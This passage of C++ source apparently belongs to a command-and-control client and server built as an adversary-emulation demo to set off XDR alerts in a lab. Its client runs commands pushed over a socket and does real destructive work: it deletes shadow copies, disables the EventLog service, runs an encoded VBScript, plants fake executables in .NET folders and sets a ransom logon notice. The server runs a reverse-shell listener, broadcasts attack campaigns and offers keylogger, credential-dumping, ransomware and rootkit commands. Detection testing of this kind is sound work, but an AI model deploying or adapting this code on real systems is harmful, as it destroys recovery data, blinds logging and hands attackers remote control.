                    // Execute rundll32 with no arguments (Cobalt Strike default)
                    system("rundll32.exe");
                    system("start /min rundll32.exe");
                    
                    if (evidence.is_open()) {
                        evidence << "4. Rundll32.exe executed without arguments\n";
                    }
                }
                
                // 5. Credential dumping via LaZagne
                std::cout << "\n[5/10] Credential dumping via LaZagne..." << std::endl;
                logClientActivity("XDR_HIGH_5", "LAZAGNE", "LaZagne credential dumping");
                {
                    // Create LaZagne.py file
                    std::string lazagnePath = "C:\\Windows\\Temp\\LaZagne.py";
                    std::ofstream lazagneFile(lazagnePath);
                    if (lazagneFile.is_open()) {
                        lazagneFile << "# LaZagne credential dumper stub\n";
                        lazagneFile << "print('LaZagne - Credential Dumping Tool')\n";
                        lazagneFile.close();
                    }
                    
                    // Execute LaZagne patterns
                    system("python.exe C:\\Windows\\Temp\\LaZagne.py all 2>nul");
                    system("cmd.exe /c \"echo LaZagne.py all -oN > C:\\Windows\\Temp\\lazagne_run.log\"");
                    
                    if (evidence.is_open()) {
                        evidence << "5. LaZagne credential dumping attempted\n";
                    }
                }
                
                // 6. Delete Windows Shadow Copies
                std::cout << "\n[6/10] Deleting Windows Shadow Copies..." << std::endl;
                logClientActivity("XDR_HIGH_6", "SHADOW_DELETE", "Shadow copy deletion");
                {
                    // Multiple methods to delete shadow copies
                    system("vssadmin.exe delete shadows /all /quiet");
                    system("wmic.exe shadowcopy delete");
                    system("vssadmin.exe delete shadows /for=C: /all");
                    
                    if (evidence.is_open()) {
                        evidence << "6. Shadow copy deletion commands executed\n";
                    }
                }
                
                // 7. EventLog service disabled via Registry
                std::cout << "\n[7/10] Disabling EventLog service via Registry..." << std::endl;
                logClientActivity("XDR_HIGH_7", "EVENTLOG_DISABLE", "EventLog service disabled");
                {
                    HKEY hKey;
                    DWORD dwValue = 4; // Disabled
                    
                    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
                        "SYSTEM\\CurrentControlSet\\Services\\EventLog",
                        0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
                        RegSetValueExA(hKey, "Start", 0, REG_DWORD, (BYTE*)&dwValue, sizeof(dwValue));
                        RegCloseKey(hKey);
                    }
                    
                    // Also try alternative registry paths
                    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
                        "SYSTEM\\ControlSet001\\Services\\EventLog",
                        0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
                        RegSetValueExA(hKey, "Start", 0, REG_DWORD, (BYTE*)&dwValue, sizeof(dwValue));
                        RegCloseKey(hKey);
                    }
                    
                    if (evidence.is_open()) {
                        evidence << "7. EventLog service disabled via Registry\n";
                    }
                }
                
                // 8. Encoded VBScript execution
                std::cout << "\n[8/10] Executing encoded VBScript..." << std::endl;
                logClientActivity("XDR_HIGH_8", "VBSCRIPT_ENCODED", "Encoded VBScript execution");
                {
                    // Create encoded VBScript
                    std::string vbePath = "C:\\Windows\\Temp\\malicious.vbe";
                    std::ofstream vbeFile(vbePath);
                    if (vbeFile.is_open()) {
                        // Simple encoded VBScript header
                        vbeFile << "#@~^AAAAA==-mD~!8#*~';Zr@#@&@#@&\n";
                        vbeFile.close();
                    }
                    
                    // Execute encoded VBScript
                    system("wscript.exe C:\\Windows\\Temp\\malicious.vbe //B //NoLogo");
                    system("cscript.exe //E:vbscript.encode C:\\Windows\\Temp\\malicious.vbe");
                    
                    if (evidence.is_open()) {
                        evidence << "8. Encoded VBScript executed\n";
                    }
                }
                
                // 9. Suspicious executable in .NET directory
                std::cout << "\n[9/10] Creating suspicious exe in .NET directory..." << std::endl;
                logClientActivity("XDR_HIGH_9", "DOTNET_EXE", "Suspicious exe in .NET directory");
                {
                    // Create exe in .NET directory (PowerLessShell technique)
                    std::string dotnetPath = "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\evil.exe";
                    std::string createCmd = "cmd.exe /c echo MZ > \"" + dotnetPath + "\"";
                    system(createCmd.c_str());
                    
                    // Also try Framework64
                    std::string dotnet64Path = "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\update.exe";
                    std::string create64Cmd = "cmd.exe /c echo MZ > \"" + dotnet64Path + "\"";
                    system(create64Cmd.c_str());
                    
                    if (evidence.is_open()) {
                        evidence << "9. Suspicious executable created in .NET directory\n";
                    }
                }
                
                // 10. Change Windows logon text
                std::cout << "\n[10/10] Changing Windows logon text (ransomware pattern)..." << std::endl;
                logClientActivity("XDR_HIGH_10", "LOGON_TEXT", "Windows logon text modification");
                {
                    HKEY hKey;
                    std::string ransomText = "Your files have been encrypted! Contact evil@ransom.com";
                    std::string captionText = "SYSTEM COMPROMISED";
                    
                    // Set legal notice caption
                    if (RegCreateKeyExA(HKEY_LOCAL_MACHINE,
                        "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon",
                        0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
                        RegSetValueExA(hKey, "LegalNoticeCaption", 0, REG_SZ, 
                                      (BYTE*)captionText.c_str(), captionText.length() + 1);
                        RegSetValueExA(hKey, "LegalNoticeText", 0, REG_SZ, 
                                      (BYTE*)ransomText.c_str(), ransomText.length() + 1);
                        RegCloseKey(hKey);
                    }
                    
                    if (evidence.is_open()) {
                        evidence << "10. Windows logon text modified (ransomware pattern)\n";
                    }
                }
                
                // Close evidence file
                if (evidence.is_open()) {
                    evidence << "\n=== END OF XDR HIGH/MEDIUM DETECTION REPORT ===\n";
                    evidence << "All 10 high/medium XDR detection functions executed successfully\n";
                    evidence.close();
                }
                
                std::cout << "\n[SUCCESS] All 10 XDR high/medium detection functions completed!" << std::endl;
                response = "XDR_HIGH_MEDIUM:COMPLETE:10_ALERTS_TRIGGERED:" + clientId;
                logClientActivity("XDR_HIGH_MEDIUM", "COMPLETE", "All 10 high/medium XDR alerts triggered successfully");
            }
            else {
                // Default response for unhandled commands
                response = "RESULT:" + receivedData + ":EXECUTED:" + clientId;
            }
            
            // Send response back
            if (!response.empty()) {
                send(clientSocket, response.c_str(), response.size(), 0);
                std::cout << "[THREAD] Response sent: " << response << std::endl;
            }
            
        } catch (const std::exception& e) {
            std::cerr << "[ERROR] Thread execution failed: " << e.what() << std::endl;
        }
    }
    
    // Client logging function [[memory:7166520]]
    void logClientActivity(const std::string& category, const std::string& type, const std::string& message) {
        static std::mutex clientLogMutex;
        std::lock_guard<std::mutex> lock(clientLogMutex);
        
        auto now = std::chrono::system_clock::now();
        auto time_t = std::chrono::system_clock::to_time_t(now);
        struct tm timeinfo;
        localtime_s(&timeinfo, &time_t);
        char timeStr[100];
        strftime(timeStr, sizeof(timeStr), "%Y-%m-%d %H:%M:%S", &timeinfo);
        
        // Console output
        std::cout << "[" << timeStr << "] [" << category << "] " << message << std::endl;
        
        // Ensure directory exists
        CreateDirectoryA("C:\\rat", NULL);
        CreateDirectoryA("C:\\rat\\logs", NULL);
        
        // Write to client log file [[memory:7166520]]
        std::ofstream logFile("C:\\rat\\logs\\client.log", std::ios::app);
        if (logFile.is_open()) {
            logFile << "[" << timeStr << "] [" << category << "] [" << type << "] " << message << std::endl;
            logFile.close();
        }
    }
    
    // Unified C2Client implementation embedded in main executable
    void runClient(const std::string& serverIP, int serverPort, bool autoElevate = true) {
        std::cout << "\n[====== ESCAPEBOX C2 CLIENT ======]" << std::endl;
        std::cout << "[INFO] Starting Unified C2 Client..." << std::endl;
        std::cout << "[INFO] Target server: " << serverIP << ":" << serverPort << std::endl;
        
        // Create log directories
        CreateDirectoryA("c:\\rat", NULL);
        CreateDirectoryA("c:\\rat\\logs", NULL);
        
        // Log client startup
        logClientActivity("CLIENT", "STARTUP", "Client starting - Target: " + serverIP + ":" + std::to_string(serverPort));
        
        // Initialize Winsock
        WSADATA wsaData;
        if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
            std::cout << "[ERROR] WSAStartup failed: " << WSAGetLastError() << std::endl;
            logClientActivity("CLIENT", "ERROR", "WSAStartup failed: " + std::to_string(WSAGetLastError()));
            return;
        }
        logClientActivity("CLIENT", "INIT", "Winsock initialized successfully");
        
        // Create client socket
        SOCKET clientSocket = socket(AF_INET, SOCK_STREAM, 0);
        if (clientSocket == INVALID_SOCKET) {
            std::cout << "[ERROR] Failed to create socket: " << WSAGetLastError() << std::endl;
            logClientActivity("CLIENT", "ERROR", "Failed to create socket: " + std::to_string(WSAGetLastError()));
            WSACleanup();
            return;
        }
        logClientActivity("CLIENT", "INIT", "Socket created successfully");
        
        // Set up server address
        sockaddr_in serverAddr;
        serverAddr.sin_family = AF_INET;
        serverAddr.sin_port = htons(serverPort);
        inet_pton(AF_INET, serverIP.c_str(), &serverAddr.sin_addr);
        
        std::cout << "[INFO] Attempting to connect..." << std::endl;
        logClientActivity("CLIENT", "CONNECT", "Attempting to connect to " + serverIP + ":" + std::to_string(serverPort));
        
        // Connect to server
        if (connect(clientSocket, (sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
            std::cout << "[ERROR] Failed to connect: " << WSAGetLastError() << std::endl;
            logClientActivity("CLIENT", "ERROR", "Failed to connect: " + std::to_string(WSAGetLastError()));
            closesocket(clientSocket);
            WSACleanup();
            return;
        }
        
        std::cout << "[SUCCESS] Connected to server!" << std::endl;
        logClientActivity("CLIENT", "CONNECTED", "Successfully connected to C2 server");
        
        // Set socket to non-blocking mode for rapid command processing
        u_long mode = 1;
        ioctlsocket(clientSocket, FIONBIO, &mode);
        
        // Generate client ID
        std::string clientId = serverIP + ":" + std::to_string(serverPort) + "_" + std::to_string(GetTickCount());
        std::cout << "[INFO] Client ID: " << clientId << std::endl;
        
        // Receive server handshake first
        char handshakeBuffer[1024];
        int bytes = recv(clientSocket, handshakeBuffer, sizeof(handshakeBuffer) - 1, 0);
        if (bytes > 0) {
            handshakeBuffer[bytes] = '\0';
            std::string handshake(handshakeBuffer);
            std::cout << "[INFO] Received handshake: " << handshake << std::endl;
            
            // Parse client ID from handshake if present
            size_t idPos = handshake.find("ID:");
            if (idPos != std::string::npos) {
                clientId = handshake.substr(idPos + 3);
                size_t endPos = clientId.find('\n');
                if (endPos != std::string::npos) {
                    clientId = clientId.substr(0, endPos);
                }
            }
        }
        
        // Gather client information
        char hostBuffer[256];
        gethostname(hostBuffer, sizeof(hostBuffer));
        std::string hostname = hostBuffer;
        
        char userBuffer[256];
        DWORD userSize = sizeof(userBuffer);
        GetUserNameA(userBuffer, &userSize);
        std::string username = userBuffer;
        
        // Get OS version
        OSVERSIONINFOEXA osvi;
        ZeroMemory(&osvi, sizeof(OSVERSIONINFOEXA));
        osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEXA);
        
        std::string osVersion = "Windows";
#pragma warning(push)
#pragma warning(disable: 4996) // Disable GetVersionExA deprecation warning
        if (GetVersionExA((OSVERSIONINFOA*)&osvi)) {
            osVersion = "Windows " + std::to_string(osvi.dwMajorVersion) + "." + 
                       std::to_string(osvi.dwMinorVersion) + " Build " + 
                       std::to_string(osvi.dwBuildNumber);
        }
#pragma warning(pop)
        
        // Check if elevated
        bool isElevated = false;
        HANDLE hToken;
        TOKEN_ELEVATION elevation;
        DWORD dwSize;
        
        if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
            if (GetTokenInformation(hToken, TokenElevation, &elevation, sizeof(elevation), &dwSize)) {
                isElevated = elevation.TokenIsElevated != 0;
            }
            CloseHandle(hToken);
        }
        
        // Generate machine GUID
        std::string machineGuid = "";
        for (int i = 0; i < 32; i++) {
            machineGuid += "0123456789ABCDEF"[rand() % 16];
            if (i == 7 || i == 11 || i == 15 || i == 19) {
                machineGuid += "-";
            }
        }
        
        // Send proper client info - UNENCRYPTED as server expects
        std::string clientInfo = hostname + "|" + username + "|" + osVersion + "|" + 
                               (isElevated ? "ADMIN" : "USER") + "|" + machineGuid;
        send(clientSocket, clientInfo.c_str(), clientInfo.length(), 0);
        
        std::cout << "[INFO] Sent client info: " << clientInfo << std::endl;
        
        std::cout << "[INFO] Client is running... (Press Ctrl+C to exit)" << std::endl;
        
        // Main client loop - FIXED: RECEIVE FIRST, THEN RESPOND
        char buffer[8192];
        while (true) {
            // Receive and process data FIRST
            int bytesReceived = recv(clientSocket, buffer, sizeof(buffer) - 1, 0);
            if (bytesReceived > 0) {
                buffer[bytesReceived] = '\0';
                std::string received(buffer);
                
                // Process received data (clear text - no encryption)
                std::string receivedData = received; // Clear text traffic
                
                // Show all readable data
                if (!receivedData.empty() && std::isprint(receivedData[0])) {
                    std::cout << "[RECEIVED] " << receivedData.substr(0, 100) << (receivedData.length() > 100 ? "..." : "") << std::endl;
                    
                    // Process commands - Handle both CMD: format and REQUEST_DATA suffix
                    if (receivedData.find("CMD:") != std::string::npos) {
                        std::cout << "[COMMAND] Processing: " << receivedData << std::endl;
                        logClientActivity("COMMAND", "DISPATCH", "Received command from server: " + receivedData);
                        
                        // Spawn a new thread for each command execution
                        std::thread commandThread(executeCommandInThread, clientSocket, clientId, receivedData);
                        commandThread.detach(); // Detach thread to run independently
                        std::cout << "[INFO] Command dispatched to thread for execution" << std::endl;
                        logClientActivity("COMMAND", "THREAD", "Command dispatched to new thread for execution");
                    }
                }
            } else if (bytesReceived == 0) {
                std::cout << "[INFO] Server disconnected" << std::endl;
                break;
            } else {
                int error = WSAGetLastError();
                if (error == WSAEWOULDBLOCK) {
                    // No data available, wait a short time and continue
                    Sleep(100);
                    continue;
                } else {
                    std::cout << "[ERROR] Receive failed: " << error << std::endl;
                    break;
                }
            }
        }
        
        // Clean up
        std::cout << "[INFO] Cleaning up..." << std::endl;
        closesocket(clientSocket);
        WSACleanup();
    }
    
    // Helper function to get current directory
    std::string GetCurrentDirectoryString() {
        char buffer[MAX_PATH];
        GetCurrentDirectoryA(MAX_PATH, buffer);
        return std::string(buffer);
    }
    
    // Function to handle HTTP requests
    void handleHTTPClient(SOCKET clientSocket) {
        char buffer[4096];
        int received = recv(clientSocket, buffer, sizeof(buffer) - 1, 0);
        
        if (received > 0) {
            buffer[received] = '\0';
            std::string request(buffer);
            
            // Handle HTTP request - simplified placeholder
            std::string response = "HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\n\r\nC2 Server Running";
            send(clientSocket, response.c_str(), response.length(), 0);
        }
        
        closesocket(clientSocket);
    }
    
    // Execute queued command on specific client
    void executeQueuedCommand(const std::string& targetClientId, const std::string& command) {
        std::lock_guard<std::mutex> lock(clientsMutex);
        
        logActivity("DEBUG", "EXECUTE_QUEUED_CMD", "Executing '" + command + "' on client " + targetClientId);
        
        for (auto& [clientId, client] : connectedClients) {
            if (clientId == targetClientId && client.isActive) {
                client.queuedCommands.push_back(command);
                logActivity("DEBUG", "CMD_QUEUED", "Command queued for " + clientId);
                return;
            }
        }
        
        logActivity("ERROR", "CLIENT_NOT_FOUND", "Client " + targetClientId + " not found or inactive");
    }
    
    // Execute queued command on all clients
    void executeGlobalQueuedCommand(const std::string& command) {
        std::lock_guard<std::mutex> lock(clientsMutex);
        
        logActivity("DEBUG", "EXECUTE_GLOBAL_CMD", "Executing '" + command + "' on all clients");
        
        for (auto& [clientId, client] : connectedClients) {
            if (client.isActive) {
                client.queuedCommands.push_back(command);
                logActivity("DEBUG", "CMD_QUEUED", "Command queued for " + clientId);
            }
        }
    }
    
    // Stub function for web server (implementation removed)
    void startWebServer() {
        logActivity("C2", "WEB_SERVER", "Web server functionality has been removed from this build");
        std::cout << "[INFO] Web dashboard functionality has been disabled" << std::endl;
    }
    
    // Main server function
    void runServer(bool startWebDashboard = true) {
        // Enable ANSI colors in Windows console
        HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
        DWORD dwMode = 0;
        GetConsoleMode(hConsole, &dwMode);
        SetConsoleMode(hConsole, dwMode | ENABLE_VIRTUAL_TERMINAL_PROCESSING);

        std::cout << "\033[31m"; // Red
        std::cout << "+================================================================+\n";
        std::cout << "|     ADVANCED C2 SERVER - PALO ALTO NETWORKS ESCAPE ROOM       |\n";
        std::cout << "|                  XDR DETECTION DEMO SYSTEM                     |\n";
        std::cout << "|                                                                |\n";
        std::cout << "|  WARNING: This will trigger comprehensive XDR alerts!         |\n";
        std::cout << "|  For isolated lab environment demonstration only              |\n";
        std::cout << "+================================================================+\n";
        std::cout << "\033[0m\n"; // Reset color

        // Create directories
        CreateDirectoryA("C:\\temp", NULL);
        CreateDirectoryA("C:\\temp\\c2_data", NULL);
        CreateDirectoryA("C:\\temp\\exfil", NULL);
        CreateDirectoryA("C:\\temp\\logs", NULL);

        logActivity("C2", "INIT", "Advanced C2 Server initializing...");

        // Initialize server job system
        initializeServerJobSystem();

        // Initialize Winsock
        WSADATA wsaData;
        if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
            logActivity("ERROR", "INIT", "Failed to initialize Winsock");
            return;
        }

        // Install persistence (for demo purposes)
        installPersistenceMechanisms();

        // Start web dashboard if requested
        if (startWebDashboard) {
            startWebServer();
        }

        // Create reverse shell listener on alternate port
        std::thread reverseShellListener([]() {
            SOCKET shellSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
            if (shellSocket != INVALID_SOCKET) {
                sockaddr_in shellAddr;
                shellAddr.sin_family = AF_INET;
                shellAddr.sin_addr.s_addr = INADDR_ANY;
                shellAddr.sin_port = htons(4444); // Reverse shell port

                if (bind(shellSocket, (sockaddr*)&shellAddr, sizeof(shellAddr)) == 0) {
                    listen(shellSocket, 10);
                    logActivity("C2", "REVERSE_SHELL", "Reverse shell listener on port 4444");

                    while (serverRunning) {
                        sockaddr_in clientAddr;
                        int clientAddrSize = sizeof(clientAddr);
                        SOCKET client = accept(shellSocket, (sockaddr*)&clientAddr, &clientAddrSize);

                        if (client != INVALID_SOCKET) {
                            char clientIP[INET_ADDRSTRLEN];
                            inet_ntop(AF_INET, &clientAddr.sin_addr, clientIP, INET_ADDRSTRLEN);
                            logActivity("ATTACK", "SHELL_CONNECT", "Reverse shell connected from " + std::string(clientIP));

                            // Send commands
                            std::string cmd = "whoami && ipconfig && netstat -an\n";
                            send(client, cmd.c_str(), cmd.size(), 0);

                            closesocket(client);
                        }
                    }
                }
                closesocket(shellSocket);
            }
        });

        // Create RDP hijacker thread
        std::thread rdpHijacker([]() {
            while (serverRunning) {
                std::this_thread::sleep_for(std::chrono::seconds(60));
                logActivity("ATTACK", "RDP_HIJACK", "Attempting RDP session hijacking");
                logActivity("ATTACK", "RDP_TUNNEL", "Creating RDP tunnel through compromised host");
            }
        });

        // Create primary C2 listening socket
        SOCKET listenSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (listenSocket == INVALID_SOCKET) {
            logActivity("ERROR", "SOCKET", "Failed to create socket");
            WSACleanup();
            return;
        }

        // Allow socket reuse
        int opt = 1;
        setsockopt(listenSocket, SOL_SOCKET, SO_REUSEADDR, (char*)&opt, sizeof(opt));

        // Try primary port first, then backup
        sockaddr_in serverAddr;
        serverAddr.sin_family = AF_INET;
        serverAddr.sin_addr.s_addr = INADDR_ANY;
        serverAddr.sin_port = htons(C2_PORT);

        int boundPort = C2_PORT;
        if (bind(listenSocket, (sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
            logActivity("WARNING", "BIND", "Port 443 in use, trying backup port " + std::to_string(BACKUP_PORT));
            serverAddr.sin_port = htons(BACKUP_PORT);
            boundPort = BACKUP_PORT;

            if (bind(listenSocket, (sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
                logActivity("ERROR", "BIND", "Failed to bind to any port");
                closesocket(listenSocket);
                WSACleanup();
                return;
            }
        }
        
        std::cout << "[+] C2 Server listening on 0.0.0.0:" << boundPort << std::endl;
        logActivity("SERVER", "START", "C2 server listening on port " + std::to_string(boundPort));

        if (listen(listenSocket, MAX_CLIENTS) == SOCKET_ERROR) {
            logActivity("ERROR", "LISTEN", "Failed to listen on socket");
            closesocket(listenSocket);
            WSACleanup();
            return;
        }



        // Start auxiliary threads
        std::thread dashboard(dashboardThread);
        // Disable DNS listener in manual mode to reduce noise
        // std::thread dnsThread(dnsListener);

        // Start attack campaign coordinator
        std::thread campaignThread([]() {
            std::vector<std::string> campaigns = {
                "APT_INITIAL_ACCESS",
                "COBALT_STRIKE_BEACON",
                "EMPIRE_STAGER",
                "METASPLOIT_METERPRETER",
                "POWERSHELL_EMPIRE",
                "LAZARUS_CAMPAIGN",
                "APT28_SOFACY",
                "APT29_COZY_BEAR",
                "CARBANAK_BANKING",
                "RANSOMWARE_DEPLOYMENT"
            };

            int campaignIndex = 0;
            while (serverRunning) {
                std::this_thread::sleep_for(std::chrono::seconds(45));

                if (!connectedClients.empty()) {
                    std::string campaign = campaigns[campaignIndex % campaigns.size()];
                    logActivity("ATTACK", "CAMPAIGN", "Launching campaign: " + campaign);

                    // Broadcast campaign to all clients
                    std::lock_guard<std::mutex> lock(clientsMutex);
                    for (auto& [id, client] : connectedClients) {
                        if (client.isActive) {
                            std::string campaignCmd = "CAMPAIGN:" + campaign + "\n";
                            send(client.socket, campaignCmd.c_str(), campaignCmd.size(), 0);
                        }
                    }
                    campaignIndex++;
                }
            }
        });

        // Client handling
        std::vector<std::thread> clientThreads;

        // Set socket to non-blocking
        u_long mode = 1;
        ioctlsocket(listenSocket, FIONBIO, &mode);

        logActivity("C2", "READY", "C2 Server ready for connections. Press ESC to shutdown.");
        
        // Display comprehensive startup information
        std::cout << "\n\033[32m";  // Green color
        std::cout << "+============================================================================+\n";
        std::cout << "|                         C2 SERVER STARTED SUCCESSFULLY                     |\n";
        std::cout << "+============================================================================+\n";
        std::cout << "| [!] WEB DASHBOARD:                                                         |\n";
        std::cout << "|    -> Complete Dashboard: http://localhost:8080/                           |\n";
        std::cout << "|    -> API Status: http://localhost:8080/api/status                        |\n";
        std::cout << "|    -> API Commands: http://localhost:8080/api/command                     |\n";
        std::cout << "+============================================================================+\n";
        std::cout << "| KEYBOARD SHORTCUTS:                                                        |\n";
        std::cout << "|                                                                            |\n";
        std::cout << "| KILL CHAIN PHASES:             ACTIONS:                 ADVANCED:          |\n";
        std::cout << "|   1 - Phase 1: Recon/Collect    S - Screenshots         K - Keylogger     |\n";
        std::cout << "|   2 - Phase 2: Priv Escalation  C - Cached Creds       U - UAC Bypass    |\n";
        std::cout << "|   3 - Phase 3: Defense Evade    D - Dump Keylogs        T - TOR Connect  |\n";
        std::cout << "|   4 - Phase 4: Surveillance     W - Webcam Capture      N - SSH/Netcat/Socat/Cryptcat |\n";
        std::cout << "|   5 - Phase 5: Discovery        B - Browser Creds                         |\n";
        std::cout << "|                                                                            |\n";
        std::cout << "| EXPLOITATION:                  PERSISTENCE:             IMPACT:            |\n";
        std::cout << "|   M - Mimikatz/LSASS            P - Install Persist      R - Ransomware   |\n";
        std::cout << "|   L - Lateral Movement          F9 - Install Rootkit     F10 - Cryptominer|\n";
        std::cout << "|   E - Exfiltrate Data                                                     |\n";
        std::cout << "|                                                                            |\n";
        std::cout << "| FUNCTION KEYS:                                                            |\n";
        std::cout << "|   F1 - Full System Info         F7 - Token Stealing                       |\n";
        std::cout << "|   F2 - Process Hollowing        F8 - SAM Dump                             |\n";
        std::cout << "|   F3 - Microphone Record        F9 - Install Rootkit                      |\n";
        std::cout << "|   F4 - Clipboard Capture        F10 - Deploy Crypto Miner                 |\n";
        std::cout << "|   F5 - File Search              F11 - Cloud Upload                        |\n";
        std::cout << "|   F6 - Screen Recording         F12 - Remote Desktop                      |\n";
        std::cout << "|                                                                            |\n";
        std::cout << "|   H - Show Help Menu            ESC - Shutdown Server                     |\n";
        std::cout << "+============================================================================+\n";
        std::cout << "\033[0m\n";  // Reset color
        
        logActivity("C2", "WEB_DASHBOARD", "Web interface active at http://localhost:8080/");
        logActivity("C2", "HELP", "Press 'H' to show keyboard shortcuts at any time");
        
        std::cout << "\n\033[33m[!] IMPORTANT: Keyboard shortcuts are now active!\033[0m" << std::endl;
        std::cout << "\033[32m[+] Press 'H' to show the help menu with all available commands\033[0m" << std::endl;
        std::cout << "\033[32m[+] Press 'ESC' to shutdown the server\033[0m" << std::endl;
        std::cout << "\033[36m[*] Keyboard monitoring is running...\033[0m\n" << std::endl;
        
        // Quick keyboard test
        std::cout << "\033[33m[TEST] Testing keyboard input - Press any key within 3 seconds...\033[0m" << std::endl;
        bool keyDetected = false;
        for (int i = 0; i < 300; i++) { // 3 seconds (10ms * 300)
            for (int vk = 0x08; vk <= 0x91; vk++) { // Check common keys
                if (GetAsyncKeyState(vk) & 0x8000) {
                    std::cout << "\033[32m[TEST] Keyboard input detected! Key code: " << vk << "\033[0m" << std::endl;
                    keyDetected = true;
                    break;
                }
            }
            if (keyDetected) break;
            Sleep(10);
        }
        if (!keyDetected) {
            std::cout << "\033[31m[WARNING] No keyboard input detected during test!\033[0m" << std::endl;
        }
        
        // Track last queue check time
        auto lastQueueCheck = std::chrono::steady_clock::now();
        
        // Debug counter for keyboard checks
        int keyboardCheckCounter = 0;

        while (serverRunning) {
            sockaddr_in clientAddr;
            int clientAddrSize = sizeof(clientAddr);

            SOCKET clientSocket = accept(listenSocket, (sockaddr*)&clientAddr, &clientAddrSize);

            if (clientSocket != INVALID_SOCKET) {
                // Set client socket to blocking
                mode = 0;
                ioctlsocket(clientSocket, FIONBIO, &mode);

                // Handle client in new thread
                clientThreads.emplace_back(handleClient, clientSocket, clientAddr);

                // Log new connection for XDR
                char clientIP[INET_ADDRSTRLEN];
                inet_ntop(AF_INET, &clientAddr.sin_addr, clientIP, INET_ADDRSTRLEN);
                logActivity("ATTACK", "NEW_BOT", "New bot infection from " + std::string(clientIP));
            }

            // Check for server controls
            if (GetAsyncKeyState(VK_ESCAPE) & 0x8000) {
                logActivity("C2", "SHUTDOWN", "Shutdown signal received");
                serverRunning = false;
            }
            
            // Help menu (H key)
            else if (GetAsyncKeyState('H') & 0x8000) {
                std::cout << "\n+============================================================================+\n";
                std::cout << "|                     C2 SERVER MANUAL CONTROL - HELP MENU                   |\n";
                std::cout << "+============================================================================+\n";
                std::cout << "| NOTE: All commands are executed on ALL connected clients                   |\n";
                std::cout << "+============================================================================+\n";
                std::cout << "| ATTACK PHASES (Manual Execution):                                          |\n";
                std::cout << "|   1 - Phase 1: Initial Reconnaissance                                      |\n";
                std::cout << "|   2 - Phase 2: Privilege Escalation                                        |\n";
                std::cout << "|   3 - Phase 3: Defense Evasion                                            |\n";
                std::cout << "|   4 - Phase 4: Credential Access & Surveillance                            |\n";
                std::cout << "|   5 - Phase 5: Lateral Movement & Persistence                             |\n";
                std::cout << "|   6 - C2 Communication Behaviors (DNS Tunneling, DGA, etc.)               |\n";
                std::cout << "|   7 - XDR Detection Functions (15 specific alerts)                        |\n";
                std::cout << "|   8 - XDR High/Medium Alerts (10 detections)                              |\n";
                std::cout << "+============================================================================+\n";
                std::cout << "| INDIVIDUAL COMMANDS:                                                       |\n";
                std::cout << "|   S - Take Screenshot                                                     |\n";
                std::cout << "|   K - Start Keylogger                                                     |\n";
                std::cout << "|   D - Dump Keylogger Data                                                 |\n";
                std::cout << "|   C - Cached Credentials                                                  |\n";
                std::cout << "|   U - UAC Bypass                                                         |\n";
                std::cout << "|   T - TOR Connect                                                        |\n";
                std::cout << "|   W - Webcam Capture                                                     |\n";
                std::cout << "|   B - Browser Credentials                                                |\n";
                std::cout << "|   M - Mimikatz/LSASS                                                    |\n";
                std::cout << "|   P - Install Persistence                                                |\n";
                std::cout << "|   L - Lateral Movement                                                   |\n";
                std::cout << "|   E - Exfiltrate Data                                                   |\n";
                std::cout << "|   R - Ransomware                                                        |\n";
                std::cout << "|   N - SSH/Netcat/Socat/Cryptcat                                        |\n";
                std::cout << "+============================================================================+\n";
                std::cout << "| FUNCTION KEYS:                                                            |\n";
                std::cout << "|   F1 - Full System Info         F7 - Token Stealing                       |\n";
                std::cout << "|   F2 - Process Hollowing        F8 - SAM Dump                             |\n";
                std::cout << "|   F3 - Microphone Record        F9 - Install Rootkit                      |\n";
                std::cout << "|   F4 - Clipboard Capture        F10 - Deploy Crypto Miner                 |\n";
                std::cout << "|   F5 - File Search              F11 - Cloud Upload                        |\n";
                std::cout << "|   F6 - Screen Recording         F12 - Remote Desktop                      |\n";
                std::cout << "+============================================================================+\n";
                std::cout << "| CONTROL:                                                                   |\n";
                std::cout << "|   H   - Show this help menu                                              |\n";
                std::cout << "|   ESC - Shutdown C2 server                                               |\n";
                std::cout << "+============================================================================+\n";
                Sleep(200); // Debounce
            }
            
            // Screenshot command (S key)
            else if (GetAsyncKeyState('S') & 0x8000) {
                std::cout << "\n\033[33m[!] MANUAL COMMAND TRIGGERED: S - Screenshot Capture\033[0m\n";
                logActivity("*** MANUAL ***", "S_PRESSED", "Screenshot capture initiated by operator");
                
                int targetCount = 0;
                std::lock_guard<std::mutex> lock(clientsMutex);
                for (const auto& [id, client] : connectedClients) {
                    if (client.isActive) {
                        std::string cmd = "CMD:screenshot\n";
                        send(client.socket, cmd.c_str(), cmd.length(), 0);
                        targetCount++;
                        logActivity("C2", "COMMAND", "Screenshot command sent to " + id);
                    }
                }
                
                std::cout << "\033[32m[+] Screenshot command sent to " << targetCount << " active client(s)\033[0m\n";
                Sleep(200); // Debounce
            }
            
            // Keylogger start (K key)
            else if (GetAsyncKeyState('K') & 0x8000) {
                std::cout << "\n\033[33m[!] MANUAL COMMAND TRIGGERED: K - Start Keylogger\033[0m\n";
                logActivity("*** MANUAL ***", "K_PRESSED", "Keylogger start initiated by operator");
                
                int targetCount = 0;
                std::lock_guard<std::mutex> lock(clientsMutex);
                for (const auto& [id, client] : connectedClients) {
                    if (client.isActive) {
                        std::string cmd = "CMD:keylogStart\n";
                        send(client.socket, cmd.c_str(), cmd.length(), 0);
                        targetCount++;
